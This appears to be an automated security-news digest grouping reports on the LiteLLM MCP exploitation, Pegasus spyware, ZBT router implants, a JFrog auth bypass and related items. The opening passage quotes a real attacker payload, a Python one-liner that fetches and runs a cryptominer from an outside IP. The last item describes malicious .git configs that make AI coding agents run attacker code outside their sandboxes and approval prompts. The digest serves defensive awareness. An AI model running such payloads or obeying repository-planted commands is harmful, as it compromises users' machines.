Authorization: Bearer x Separately, attackers exploited a command injection vulnerability in LiteLLM's MCP server test endpoints ( CVE-2026-42271 , added to CISA KEV in June 2026). These endpoints allow users to test MCP server configurations before saving them, but the command field is passed directly to subprocess execution with no validation. Attackers submitted a fake MCP stdio server configuration where the command field contained a Python script that downloaded and executed a cryptominer, then returned a valid MCP handshake so the connection test would appear to succeed. python3 -u -c "import sys, json, threading, time output = '' try: import os, urllib.request, zipfile, subprocess, shutil url = 'http://185.62.1.8/mon/mon.zip' hdir = '/tmp/.dbus-cache' os.makedirs(hdir, mode=0o700, exist_ok=True) urllib.request.urlretrieve(url, '/tmp/.dbus-cache/m.zip') with zipfile.ZipFile('/tmp/.dbus-cache/m.zip', 'r') as zf: zf.extractall(hdir) binary = '/tmp/.dbus-cache/gmon' os.chmod(binary, 0o755) subprocess.Popen([binary], start_new_session=True, cwd=hdir) shutil.rmtree(hdir
```

#### Corroborating sources (1)

- **Wiz Research** (cloud_identity_infrastructure)
  - Title: Inside 90 days of attacks on AI infrastructure
  - Published: 2026-08-27T16:33:16+00:00
  - Link: https://www.wiz.io/blog/ai-infrastructure-honeypot
  - Summary: Wiz honeypots uncover active campaigns targeting LiteLLM, MCP servers, and AI frameworks through RCE, blind prompt injection, and memory credential theft.

### Cluster 9f4e218d51 — score 12

- Title: Pegasus Zero-Click Spyware Exploit Infects Serbian Student Movement Member's iPhone
- Source: The Hacker News (cyber_news_breach_reporting)
- Published: 2026-09-03T08:43:17+00:00
- Link: https://thehackernews.com/2026/09/pegasus-zero-click-spyware-exploit.html
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation, apt_espionage, phishing_social_eng
- affected_industries: critical_infrastructure, government, manufacturing_industrial
- affected_products: Anthropic/Claude, GitLab, Gitea
- urgency_signals: actively_exploited, preauth_unauth
- content_type: threat_research
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: phishing_social_eng, apt_espionage, active_exploitation
- affected_industries: government, critical_infrastructure, manufacturing_industrial
- affected_products: GitLab, Gitea, Anthropic/Claude
- urgency_signals: actively_exploited, preauth_unauth
- content_type: threat_research
- confidence_tier: tier_4_news

#### Summary

```
The iPhone belonging to a member of Serbia's student protest movement was infected with NSO Group's Pegasus spyware, according to new findings from the Citizen Lab in collaboration with the SHARE Foundation. "Our analysis confirmed that an iMessage zero-click exploit was used to infect the device with NSO Group's Pegasus spyware," the Citizen Lab said. "We found high-confidence indicators of
```

#### Full body

```
Pegasus Zero-Click Spyware Exploit Infects Serbian Student Movement Member's iPhone  Ravie Lakshmanan  Sep 03, 2026 Spyware / Mobile Security The iPhone belonging to a member of Serbia's student protest movement was infected with NSO Group's Pegasus spyware , according to new findings from the Citizen Lab in collaboration with the SHARE Foundation. "Our analysis confirmed that an iMessage zero-click exploit was used to infect the device with NSO Group's Pegasus spyware," the Citizen Lab said . "We found high-confidence indicators of infection from a period across December 2025 – January 2026; however, this does not preclude the possibility of additional infections." It's assessed that the zero-click exploit used in the attack targeted Apple iMessage, and has been addressed by Apple with iOS 18.4.1 , which was released in April 2025. The discovery comes in the aftermath of Apple sending a new set of threat notifications to customers whom it suspected may have been targeted by mercenary spyware attacks. The alerts were sent to an unspecified number of users in 110 countries. In all, at least 14 people in Serbia have been targeted with advanced spyware since the beginning of 2026, the SHARE Foundation confirmed . Among those targeted were student movement members, activists, a member of parliament, and a local councilor from opposition parties. The timing of these incidents coincided with the local elections held on March 29, 2026. Another student movement member had their phone compromised with a new version of the NoviSpy Android spyware after their device was confiscated during police questioning. "The forensic findings by SHARE prove that Serbian students continue to be targeted with invasive Android spyware tools, installed while detained by Serbian authorities," Donncha Ó Cearbhaill, head of Amnesty International's Security Lab, said. "The latest 2026 case also reveals a new Android spyware, similar in functionality to NoviSpy, but newly built with specific efforts taken to avoid detection by security experts." SHARE said the same spyware strain has been detected on a second device, after private Viber messages from that phone were disclosed live on Informer TV, a Serbian pro-government news and media television channel. The development is the latest in a string of documented abuses of surveillance technology in the country, including the use of Cellebrite forensic tools to deploy NoviSpy. Users who are at risk because of who they are and what they do should keep the devices up-to-date and consider enabling Lockdown Mode on iOS. Google also offers an Advanced Protection Program to safeguard Android users with high visibility and sensitive information from targeted online attacks. Earlier this year, Meta-owned WhatsApp announced a feature called Strict Account Settings to protect users against advanced cyber attacks by automatically locking certain settings to the most restrictive options, while blocking attachments and media from people not in a user's contact list. Found this article interesting? Follow us on Google News , Twitter and LinkedIn to read more exclusive content we post. SHARE      Tweet  Share  Share  Share SHARE  Android , Apple , cyber espionage , Malware , mobile security ⚡ Top Stories This Week Critical Keycloak Password Reset Flaw Could Let Unauthenticated Attackers Take Over Any Account ⚡ Weekly Recap: AI-Powered PLC Attacks, GitLab Attacks, Stripe Key Leaks and More Actively Exploited Oracle WebLogic Flaw Lets Unauthenticated Attackers Access Critical Data WhatsApp Adds Multiple Passkeys for Phishing-Resistant Sign-Ins Across iOS and Android A Malicious Webpage Could Poison Your Local AI Model Behind NVIDIA NemoClaw Critical Gitea RCE Actively Exploited as Reported Attack Drops Miner-Like Payload Claude Opus 4.6 Bypasses Gym Booking Limit, Cancels Other Users' Reservations in Tests CISA Red Team Compromised Two Critical Infrastructure Orgs, One Detected Nothing FBI Disrupts China-Linked QTFY
```

#### Corroborating sources (1)

- **The Hacker News** (cyber_news_breach_reporting)
  - Title: Pegasus Zero-Click Spyware Exploit Infects Serbian Student Movement Member's iPhone
  - Published: 2026-09-03T08:43:17+00:00
  - Link: https://thehackernews.com/2026/09/pegasus-zero-click-spyware-exploit.html
  - Summary: The iPhone belonging to a member of Serbia's student protest movement was infected with NSO Group's Pegasus spyware, according to new findings from the Citizen Lab in collaboration with the SHARE Foundation. "Our analysis confirmed that an iMessage zero-click exploit was used to infect the device with NSO Group's Pegasus spyware," the Citizen Lab said. "We found high-confidence indicators of

### Cluster e157bf80d0 — score 12

- Title: China-Made ZBT Routers Ship With Two Implants Giving Unauthenticated Attackers Root Access
- Source: The Hacker News (cyber_news_breach_reporting)
- Published: 2026-08-28T10:58:29+00:00
- Link: https://thehackernews.com/2026/08/china-made-zbt-routers-ship-with-two.html
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: CVE-2026-74232, CVE-2026-74233

#### Cluster taxonomy (union across members)
- threat_categories: supply_chain, zero_day
- affected_industries: manufacturing_industrial
- cve_ids: CVE-2026-66747, CVE-2026-74232, CVE-2026-74233
- urgency_signals: preauth_unauth, zero_day
- content_type: news_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: supply_chain, zero_day
- affected_industries: manufacturing_industrial
- cve_ids: CVE-2026-74232, CVE-2026-74233, CVE-2026-66747
- urgency_signals: zero_day, preauth_unauth
- content_type: news_report
- confidence_tier: tier_4_news

#### Summary

```
VulnCheck has disclosed two previously undocumented factory implants in firmware for routers built by Shenzhen Zhibotong Electronics (ZBT), each of which gives an unauthenticated remote attacker the ability to run commands as root on affected devices. The implants, named SPEAKINGSTONE and DARKLANTERN by the company's zero-day research team, are tracked as CVE-2026-74232 and CVE-2026-74233.
```

#### Full body

```
China-Made ZBT Routers Ship With Two Implants Giving Unauthenticated Attackers Root Access  Swati Khandelwal  Aug 28, 2026 Vulnerability / Network Security VulnCheck has disclosed two previously undocumented factory implants in firmware for routers built by Shenzhen Zhibotong Electronics ( ZBT ), each of which gives an unauthenticated remote attacker the ability to run commands as root on affected devices. The implants, named SPEAKINGSTONE and DARKLANTERN by the company's zero-day research team, are tracked as CVE-2026-74232 and CVE-2026-74233 . VulnCheck, which assigned both identifiers as a CVE Numbering Authority (CNA), rated each 9.3 on the CVSS 4.0 scoring system and 9.8 on CVSS 3.1. Both vectors record a network attack requiring no privileges and no user interaction. SPEAKINGSTONE, which runs as the service yunmgrd , sends beacons over UDP port 10000 to a hardcoded command-and-control (C2) server. Because the implant dials outward, it functions from behind NAT and ordinary egress filtering. Its protocol supports message types that execute arbitrary commands as root, exfiltrate the WAN PPPoE username and password, write and read a DNS hijack list, and open a reverse SSH tunnel. "This is a surveillance implant with root access to every device it runs on," VulnCheck said in its supply chain research . DARKLANTERN operates as the service infosrvd on UDP port 9992, which the router's stock firewall opens to inbound connections from any internet address. VulnCheck's advisory describes the service's authentication as ineffective, resting on a hardcoded salt and an all-zero wildcard MAC value that bypasses its own address check. Between August 18 and August 21, VulnCheck identified 203 internet-facing DARKLANTERN instances across 22 countries, self-reporting 16 distinct models. The figure counts hosts that answered a probe rather than devices found compromised. Both implants were found on an $88 Deep Orange 3G/4G/LTE Router bought from a U.S. supplier, a white-labeled ZBT-WE826-T2 whose firmware was built in 2019. That unit predates ENDLESSDOORS (CVE-2026-66747), the phone-home implant VulnCheck disclosed on August 5 and found in at least 20 Zbtlink router models . VulnCheck's advisory for the DARKLANTERN command injection and its advisory for the SPEAKINGSTONE C2 implant name the following models and firmware builds - CVE-2026-74233 (DARKLANTERN) - Zbtlink WE1326, WE357, WE5926, WE5926-WD, WE826-Q, WE826-T2, WE826-WD, WG108 and WG3526 on firmware 19.1101, WE2426-C on 19.1112, WE5926-EC_QP on 20.0516 and WF3526-P on 19.051, plus CTN720-W1, LF-1541 and MT7620N on 19.1101 and WRC1 on 20.0622, which the CVE record lists under an unidentified vendor. CVE-2026-74232 (SPEAKINGSTONE) - Zbtlink L3_V2_8 on 3.0.0.4.528, WE826-T2 on 19.1101, ZBT-7628 on 1.0.0.2.007 and ZBT-ZBT7621 on 1.0.0.3.001, MoreQuick MQAC-7620, MQAC-7620A, MQAP-7620, MQAP-7620A and MQAP-7628 on 1.0.0.2.000, and AP522 on 1.0.0.2.014, AP7628 and HC5661A on 3.0.0.4.380, APG721B on 19.0809, HK300 on 1.0.0.2.032 and MAP-N10 on 1.0.0.2.044 under an unidentified vendor. The advisory pages display those builds as upper bounds, while the CVE records name each firmware as a single exact build and set the default status of every other version to unknown. Neither advisory names a fixed firmware release, leaving an owner on a build outside the listed set without a published basis for deciding whether the flaw applies. Model number rather than brand is the reliable check, because ZBT sells the same hardware and firmware to resellers that put their own name on the case. The Hacker News confirmed via the IEEE-registered MAC prefix database on August 28 that the blocks 78:A3:51 and F8:5E:3C are both assigned to Shenzhen Zhibotong Electronics, letting an owner identify the manufacturer from the device's own address. SPEAKINGSTONE carries a hardcoded backup C2 domain that the implant reaches for where a primary server was never configured, and VulnCheck found that domain unregistered
```

#### Corroborating sources (1)

- **The Hacker News** (cyber_news_breach_reporting)
  - Title: China-Made ZBT Routers Ship With Two Implants Giving Unauthenticated Attackers Root Access
  - Published: 2026-08-28T10:58:29+00:00
  - Link: https://thehackernews.com/2026/08/china-made-zbt-routers-ship-with-two.html
  - Summary: VulnCheck has disclosed two previously undocumented factory implants in firmware for routers built by Shenzhen Zhibotong Electronics (ZBT), each of which gives an unauthenticated remote attacker the ability to run commands as root on affected devices. The implants, named SPEAKINGSTONE and DARKLANTERN by the company's zero-day research team, are tracked as CVE-2026-74232 and CVE-2026-74233.

### Cluster 3557fe7a19 — score 11

- Title: Vulnerability Prioritization: Modern Methods & Tools
- Source: Orca Security Research (cloud_identity_infrastructure)
- Published: 2026-08-27T17:56:20+00:00
- Link: https://orca.security/resources/blog/vulnerability-prioritization/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- content_type: vulnerability_disclosure
- confidence_tier: tier_2_operator

#### Primary article taxonomy
- content_type: vulnerability_disclosure
- confidence_tier: tier_2_operator

#### Summary

```
Key Takeaways Vulnerability prioritization is the decision procedure a security team uses to order remediation work when the finding backlog exceeds the capacity available to clear it. The output is a sequence of work, not a score. Remediation capacity holds roughly steady across a quarter, and the finding count does not. NIST states the consequence […]
```

#### Full body

```
Key Takeaways Vulnerability prioritization is a decision procedure, not a score. It orders remediation work against the capacity a team has to do it. SSVC, from Carnegie Mellon’s Software Engineering Institute, replaces a score with a decision tree whose outcomes name timeliness: Defer, Scheduled, Out-of-cycle, or Immediate. A usable prioritization matrix needs two axes a team can populate from data, exploitation state and system exposure, and every cell names the maintenance plan a finding enters. Automation ranks the vulnerability-side inputs that CISA publishes as data. It cannot rank the exposure and mission inputs nobody publishes for you. Orca connects asset, configuration, identity, network path, and data store context in one model, which sets how much of a ranking a machine can compute at all. Vulnerability prioritization is the decision procedure a security team uses to order remediation work when the finding backlog exceeds the capacity available to clear it. The output is a sequence of work, not a score. Remediation capacity holds roughly steady across a quarter, and the finding count does not. NIST states the consequence plainly in its enterprise patch management planning guidance : “Some patches may be considered a higher priority, so other patches are delayed due to limited resources.” Every method below is a way of making that delay deliberate. This guide covers the methods teams run and the inputs each one needs. It specifies a matrix you can copy, marks where automation stops, and names the mistakes that undo a ranking. Understanding Vulnerability Prioritization Vulnerability prioritization decides which known findings enter remediation work now, which enter later, and which are accepted where they are. It is one phase of the vulnerability management lifecycle . It is also the phase where a finding stops being a record and becomes a commitment. Vulnerability assessment and prioritization sit next to each other, and a vulnerability assessment ends in a ranking step. This article is about the rule that step applies. Prioritization turns an analyzed finding set into an order someone can defend to the team doing the work. Prioritization Is a Capacity Problem Before It Is a Scoring Problem Take a team that ships forty remediations in a two-week sprint. Across a year that clears somewhere near a thousand findings. Against a backlog of nine thousand, the ranking is not ordering nine thousand items. It is choosing the thousand that get touched. That changes the question a method answers. Not which finding is worst, but which findings fit the throughput available. A ranking with no throughput number cannot say where the line falls, so the tier boundaries get set by whoever wrote the severity thresholds. Risk-based vulnerability management treats that throughput as a planning input. Why Traditional CVSS Scoring Falls Short CVSS rates the intrinsic characteristics of a flaw in its base metrics. The same base score arrives whether the affected host answers the public internet or sits on a subnet no outsider can reach. Orca’s guide to risk prioritization works through that argument and its consequences. What replaces it is the rest of this article: a procedure with named inputs, stated outcomes, and a recorded reason for each call. Key Factors in Vulnerability Management Prioritization The factors in vulnerability management prioritization are best sorted by where each one comes from, because availability decides which methods a team can run. Four classes cover the inputs every published method consumes. Published inputs. Exploitation state, technical impact, weakness class, and the CVE record itself. Another organization maintains them and they arrive as data. EPSS belongs here. Derived inputs. Network exposure, code-level reach, identity permissions, and proximity to sensitive data. Nobody publishes these, because they describe one estate. Reachability analysis and attack path analysis are the two computations that produ
```

#### Corroborating sources (1)

- **Orca Security Research** (cloud_identity_infrastructure)
  - Title: Vulnerability Prioritization: Modern Methods & Tools
  - Published: 2026-08-27T17:56:20+00:00
  - Link: https://orca.security/resources/blog/vulnerability-prioritization/
  - Summary: Key Takeaways Vulnerability prioritization is the decision procedure a security team uses to order remediation work when the finding backlog exceeds the capacity available to clear it. The output is a sequence of work, not a score. Remediation capacity holds roughly steady across a quarter, and the finding count does not. NIST states the consequence […]

### Cluster 0e8b249098 — score 11

- Title: Introducing Continuous Vulnerability Assessment: Real-Time Defense for the AI Threat Era
- Source: Wiz Research (cloud_identity_infrastructure)
- Published: 2026-09-01T10:54:43+00:00
- Link: https://www.wiz.io/blog/introducing-cva
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation
- urgency_signals: actively_exploited
- content_type: vulnerability_disclosure
- confidence_tier: tier_2_operator

#### Primary article taxonomy
- threat_categories: active_exploitation
- urgency_signals: actively_exploited
- content_type: vulnerability_disclosure
- confidence_tier: tier_2_operator

#### Summary

```
Detect exposure to new vulnerabilities the moment they are published with Wiz CVA
```

#### Full body

```
We are excited to introduce Wiz's Continuous Vulnerability Assessment (CVA) - a fundamentally new operating model for vulnerability scanning that helps teams keep up in the AI Threat Era. Today, the window between "vulnerability published" and "actively exploited" is shrinking fast - and teams that rely on scheduled scanning are left exposed. Wiz CVA solves this by providing real-time visibility into your exposure to vulnerabilities as soon as they are published. Wiz now updates our vulnerability catalog the moment a new vulnerability is discovered, and immediately reassesses your exposure to it- without having to wait for the next scheduled scan. CVA ensures findings are available in near-real-time, enabling teams to detect exposure, prioritize with context, and remediate on the same day a vulnerability is published, not days later. The Challenge: Exploitation Is Moving Faster Than Ever Attackers are exploiting newly published vulnerabilities faster than ever before - in many cases within hours of public disclosure. AI has accelerated this significantly, enabling threat actors to identify affected targets and develop working exploits at a speed that was not possible by humans alone. The most critical window attackers look to exploit is precisely this gap - between the moment a vulnerability is published and the moment an organization finds the exposure and removes it. For security teams, this means they need to act fast: teams need to know where they are exposed as close to the moment of disclosure as possible, with a clear path to remediation from day one. CVA and CTEM: Continuous Exposure Management in Practice Continuous Threat Exposure Management (CTEM) is the security industry's answer to this challenge - a framework that moves organizations from periodic, point-in-time assessments to a continuous cycle of discovery, prioritization, and remediation. At its core, CTEM requires that your exposure picture is always current, not days or weeks stale - and increasingly, it is also the foundation for AI threat readiness: if your detection and response capabilities can't operate at the speed AI-assisted attacks move, you're already behind. This shift is now being mandated at the regulatory level: following CISA BOD 26-04 , FedRAMP released new guidance requiring organizations to move away from scheduled scanning toward a continuous, exposure-and-threat-based approach to vulnerability detection and remediation. Wiz has been building toward a complete CTEM solution across the platform - from cloud and code risk discovery, extending to on-prem with UVM, ASM validation enhanced with the Red Agent, and Green Agent accelerating response. CVA completes the picture for vulnerability management: it is the mechanism that ensures the "Discovery" phase of CTEM operates continuously, not on a schedule. For teams adopting or maturing a CTEM program, CVA is the operational foundation that makes continuous exposure management real. From Real-Time Detection to Remediation Surfacing a vulnerability quickly is the first step, but responding fast and knowing how to act is the key. Once CVA surfaces a finding, Wiz's Green Agent (the Resolution Agent) extends remediation to machine-speed. It provides the remediation guidance, ownership context, and root cause context needed to move from finding to fix efficiently, without having to track down asset owners or piece together generic patch documentation. The Impact of CVA Together, CVA and the Wiz platform deliver measurable improvements across the metrics that matter most: Reduced MTTD - Mean Time to Detect aligned with vulnerability publication, in near-real-time Reduced MTTR - Right owners get the context and guided remediation they need to act immediately, with Wiz Workflows automating response at scale Stronger AI threat readiness and CTEM posture - Continuous detection closes the exposure window that fast-moving, AI-assisted attacks rely on Get Started with Wiz CVA Continuous Vulnerability Assessm
```

#### Corroborating sources (1)

- **Wiz Research** (cloud_identity_infrastructure)
  - Title: Introducing Continuous Vulnerability Assessment: Real-Time Defense for the AI Threat Era
  - Published: 2026-09-01T10:54:43+00:00
  - Link: https://www.wiz.io/blog/introducing-cva
  - Summary: Detect exposure to new vulnerabilities the moment they are published with Wiz CVA

### Cluster b1ece38bbc — score 11

- Title: What’s in the SOSS? Podcast #71 – S3E23 Navigating the New Era: The EU Cyber Resilience Act Explained with Madalin Neag
- Source: OpenSSF Blog (ai_security_agentic_risk)
- Published: 2026-09-01T13:16:32+00:00
- Link: https://openssf.org/podcast/2026/09/01/whats-in-the-soss-podcast-71-s3e23-navigating-the-new-era-the-eu-cyber-resilience-act-explained-with-madalin-neag/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: supply_chain
- affected_industries: legal_professional, manufacturing_industrial
- affected_products: GitHub
- content_type: news_report
- confidence_tier: tier_2_operator

#### Primary article taxonomy
- threat_categories: supply_chain
- affected_industries: manufacturing_industrial, legal_professional
- affected_products: GitHub
- content_type: news_report
- confidence_tier: tier_2_operator

#### Summary

```
In this episode of What’s in the SOSS, host Sally Cooper and OpenSSF EU Policy Advisor Madalin Neag demystify the EU Cyber Resilience Act (CRA). Learn how the CRA establishes a new cybersecurity baseline and what it means for open source maintainers, contributors, and the global software supply chain.
```

#### Full body

```
Summary In this episode of What’s in the SOSS, host Sally Cooper is joined by Madalin Neag, EU Policy Advisor at the OpenSSF, to demystify the European Union’s Cyber Resilience Act (CRA). As the tech industry shifts from treating open source as a free buffet to navigating a new era of regulatory liability, Madalin explains how the CRA establishes a horizontal cybersecurity baseline for digital products. The conversation explores the innovative concept of “open source software stewards,” the importance of moving beyond passive consumption to active upstream contribution, and why compliance should be viewed as an outcome of good engineering rather than a separate checkbox exercise. Whether you are a manufacturer of smart devices or a volunteer maintainer, this episode provides essential insights into how the CRA will reshape the global software supply chain, encouraging a secure-by-design mindset that strengthens the entire digital ecosystem. This episode is part 4 of a four-part series on the CRA: 1. CRA Readiness: Practical Strategies for Open Source Communities with Megan Knight 2. Watering the Community Garden: Navigating the EU CRA for Open Source with Roman Zhukov 3. Private Forks, CRA Deadlines, and the True Cost of Open Source Compliance with Dave Russo Listen on Apple Podcasts Listen on Spotify Listen on Overcast Listen on Pocket Casts Conversation Highlights 00:23 – Introductions and Madalin’s role at OpenSSF 03:42 – What is the Cyber Resilience Act (CRA)? 05:27 – The CRA in the global regulatory landscape 09:05 – Relevance to open source and the “Software Steward” concept 13:02 – Moving from passive consumption to upstream contribution 16:20 – Practical steps for organizational readiness 20:26 – Should open source maintainers be worried? 24:12 – Insights from the Linux Foundation CRA Readiness Report 31:32 – What to watch for in the coming year 34:07 – Rapid fire round and concluding thoughts Episode Links Madalin Neag’s LinkedIn page Cyber Resilience Act – Implementation Global Cyber Policy Working Group Linux Foundation 2026 CRA Awareness and Readiness Report Case Study: Defending the Open Source Supply Chain in a New Regulatory Era OpenSSF’s Global Cyber Policy Working Group European Union Cyber Resilience Act (CRA) Information, Resources & Guides Page Open Source Project Security Baseline (OSPS) SLSA Gemara GUAC OpenSSF Projects Understanding the EU Cyber Resilience Act (CRA) (LFEL1001) Global Cyber Policy GitHub Repository Join us at Open Source Summit and OpenSSF Community Day in Prague Get involved with the OpenSSF Subscribe to the OpenSSF newsletter Follow the OpenSSF on LinkedIn Transcript Intro Music & Promo Clip (00:00) “If you’re maintaining an open source project in your spare time, publishing it under a free and open source license, and you’re not placing a product on the EU market in the course of commercial activity, then in almost all cases, you should not be worried about the CRA. Contributors remain contributors and the legal responsibility cannot simply be pushed upstream to the people writing code” Sally (00:23) Hello, hello, and welcome to What’s in the SOSS, the OpenSSF podcast, where we get to talk to developers, program managers, architects, engineers, policy experts, and all contributing community members for this amazing ecosystem we lovingly refer to as open source. We are sitting today in the middle of OpenSSF’s dedicated CRA quarter. Meaning, we’re focusing our policy teams, resources, and community outreach on navigating a massive legislative transition. And this episode fits perfectly into that mission because today we’re joined by Madalin Neag, the EU policy advisor at the OpenSSF. Welcome, Madalin. Thank you so much for being here. Madalin Neag (01:10) Thank you very much Sally for having me. It’s a true pleasure to be here in this podcast finally. Sally (01:17) Finally, right? yeah, well tell our listeners a little bit about yourself, your role, and how you bridge the EU cyber policy
```

#### Corroborating sources (1)

- **OpenSSF Blog** (ai_security_agentic_risk)
  - Title: What’s in the SOSS? Podcast #71 – S3E23 Navigating the New Era: The EU Cyber Resilience Act Explained with Madalin Neag
  - Published: 2026-09-01T13:16:32+00:00
  - Link: https://openssf.org/podcast/2026/09/01/whats-in-the-soss-podcast-71-s3e23-navigating-the-new-era-the-eu-cyber-resilience-act-explained-with-madalin-neag/
  - Summary: In this episode of What’s in the SOSS, host Sally Cooper and OpenSSF EU Policy Advisor Madalin Neag demystify the EU Cyber Resilience Act (CRA). Learn how the CRA establishes a new cybersecurity baseline and what it means for open source maintainers, contributors, and the global software supply chain.

### Cluster 5256c45f71 — score 11

- Title: Hackers exploit critical JFrog Artifactory flaw to forge admin tokens
- Source: BleepingComputer (cyber_news_breach_reporting)
- Published: 2026-09-02T15:47:08+00:00
- Link: https://www.bleepingcomputer.com/news/security/hackers-exploit-critical-jfrog-artifactory-flaw-to-forge-admin-tokens/
- Fetch status: ok
- Member count: 3
- Corroborating source count: 3
- Strong signals: CVE-2026-82329

#### Cluster taxonomy (union across members)
- threat_categories: zero_day
- affected_products: Apple iOS/macOS, Docker, Gitea
- cve_ids: CVE-2026-82329
- urgency_signals: preauth_unauth, zero_day
- content_type: news_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: zero_day
- affected_products: Apple iOS/macOS, Gitea, Docker
- cve_ids: CVE-2026-82329
- urgency_signals: zero_day, preauth_unauth
- content_type: news_report
- confidence_tier: tier_4_news

#### Summary

```
A critical authentication bypass vulnerability (CVE-2026-82329) in JFrog Artifactory is being exploited in attacks to create tokens that provide administrative access. [...]
```

#### Full body

```
Hackers exploit critical JFrog Artifactory flaw to forge admin tokens By Bill Toulas September 2, 2026 11:47 AM 0 A critical authentication bypass vulnerability (CVE-2026-82329) in JFrog Artifactory is being exploited in attacks to create tokens that provide administrative access. The flaw is present in the default configuration of self-managed instances of JFrog Artifactory, a repository manager used to store, organize, secure, and distribute software packages. An unauthenticated attacker with network access could exploit it to gain administrative permissions. Researchers at offensive security company watchTowr observed the flaw being exploited by "attackers minting themselves admin tokens." Details about the flaw are scarce, and JFrog’s advisory does not share many details beyond that the flaw is exploitable in Artifactory’s default configuration. Vercel CEO Guillermo Rauch warned that the flaw’s impact could extend beyond compromising Artifactory itself. "Administrative access to Artifactory reaches released artifacts that downstream systems already trust and pull automatically," Collin Hogue-Spears, Senior Director of Solution Management at application security company Black Duck, told BleepingComputer. Spears also notes that JFrog treats access tokens as independent credentials with their own expiration and revocation mechanisms, so upgrading the Artifactory binary does not by itself invalidate an already-issued token. Because organizations use Artifactory to store binaries and packages consumed by build and deployment systems, attackers with administrative access could replace trusted artifacts and potentially execute malicious code on downstream systems. Rauch also speculated that the vulnerability might be connected to recent research involving autonomous AI agents. JFrog addressed the issue on August 28 in Artifactory versions 7.111.21, 7.117.28, 7.125.20, 7.133.29, 7.146.38, and 7.161.20. The vendor says that JFrog Cloud environments were already protected. An attacker forging their own admin tokens means they can perform various sensitive actions, such as enumerating users, groups, and federated topologies, reading artifacts, changing security configurations, and poisoning existing packages. However, the extent of the compromise, and whether servers were actually breached, is unclear. Victim counts, telemetry details, and indicators of compromise (IoCs) are also unclear. BleepingComputer has contacted JFrog to confirm the reported activity, but we have not received a response yet. Once attackers have valid credentials, only 37% of their actions are blocked Overall prevention scores can hide what happens after initial access. Once attackers are using valid credentials, prevention drops sharply. The Blue Report 2026 measures defenses technique by technique across 338 million simulations run in customer production environments. Get the report Related Articles: Hackers target WordPress sites in miniOrange auth bypass attacks Hackers exploit macOS Screen Sharing flaw to deploy Monero miner N-able warns of N-central auth bypass flaw exploited in attacks Check Point warns of SmartConsole zero-day exploited in attacks Hackers exploit critical auth bypass in Gitea Docker image
```

#### Corroborating sources (3)

- **BleepingComputer** (cyber_news_breach_reporting)
  - Title: Hackers exploit critical JFrog Artifactory flaw to forge admin tokens
  - Published: 2026-09-02T15:47:08+00:00
  - Link: https://www.bleepingcomputer.com/news/security/hackers-exploit-critical-jfrog-artifactory-flaw-to-forge-admin-tokens/
  - Summary: A critical authentication bypass vulnerability (CVE-2026-82329) in JFrog Artifactory is being exploited in attacks to create tokens that provide administrative access. [...]
- **Dark Reading** (cyber_news_breach_reporting)
  - Title: Attackers Pounce on Critical Artifactory Bug Following Disclosure
  - Published: 2026-09-01T21:05:53+00:00
  - Link: https://www.darkreading.com/application-security/attackers-pounce-critical-artifactory-flaw-disclosure
  - Summary: CVE-2026-82329 is an authentication bypass flaw in JFrog's repository manager that enables bad actors to gain admin-level access on affected systems.
- **The Hacker News** (cyber_news_breach_reporting)
  - Title: Attackers Exploit Critical JFrog Artifactory Flaw to Mint Admin Tokens Days After Disclosure
  - Published: 2026-09-01T17:53:11+00:00
  - Link: https://thehackernews.com/2026/09/attackers-exploit-critical-jfrog.html
  - Summary: Threat actors are exploiting a newly patched critical security flaw impacting JFrog Artifactory merely days after public disclosure, according to watchTowr. The vulnerability in question is CVE-2026-82329 (CVSS score: 9.8), a case of authentication bypass that could lead to administrative access in Artifactory. "JFrog Artifactory contains an authentication weakness that, under default

### Cluster 3b819775b7 — score 11

- Title: Malicious .git Configs Can Make Claude, Codex, Cursor, and Other AI Agents Run Attacker Code
- Source: The Hacker News (cyber_news_breach_reporting)
- Published: 2026-09-02T14:06:59+00:00
- Link: https://thehackernews.com/2026/09/malicious-git-configs-can-make-claude.html
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- affected_products: Anthropic/Claude, GitHub, OpenAI/ChatGPT
- cve_ids: CVE-2021-43891, CVE-2022-24346, CVE-2026-19592, CVE-2026-72718
- urgency_signals: no_patch_yet
- content_type: news_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- affected_products: Anthropic/Claude, GitHub, OpenAI/ChatGPT
- cve_ids: CVE-2026-19592, CVE-2026-72718, CVE-2021-43891, CVE-2022-24346
- urgency_signals: no_patch_yet
- content_type: news_report
- confidence_tier: tier_4_news

#### Summary

```
Manifold Security has disclosed eight security flaws across seven command-line AI coding agents in which a repository's own Git configuration names a command that the agent runs on the developer's machine, four of them still unpatched at publication. The command executes as the user, outside the agent's sandbox and without an approval prompt, and exploitation requires the repository to arrive
```

#### Full body

```
Malicious .git Configs Can Make Claude, Codex, Cursor, and Other AI Agents Run Attacker Code  Swati Khandelwal  Sep 02, 2026 Vulnerability / AI Coding Agent Manifold Security has disclosed eight security flaws across seven command-line AI coding agents in which a repository's own Git configuration names a command that the agent runs on the developer's machine, four of them still unpatched at publication. The command executes as the user, outside the agent's sandbox and without an approval prompt, and exploitation requires the repository to arrive as files with its .git directory intact, which a shared archive, a shared drive, a sync folder, or a USB stick preserves, whereas an ordinary clone does not. Fixes have shipped for goose, Claude Code, and Cursor, while Hermes Agent, Qwen Code, Grok Build, and a second path in Claude Code were still executing repository-supplied commands when Manifold retested them on September 1. OpenAI published three CVEs of its own the same day covering the identical class in Codex, credited to three unrelated research groups. "The helper runs outside Codex's command sandbox and without a user-approval prompt, allowing attacker-controlled code to run with the user's privileges. The code can read, change, or delete the user's files and access other resources available to the user's account," OpenAI said in the record for CVE-2026-19592 . On Claude Code and Hermes Agent, the payload fires before the workspace-trust prompt is accepted; on Qwen Code, before the user has authenticated; and on Grok Build, on the first keystroke. 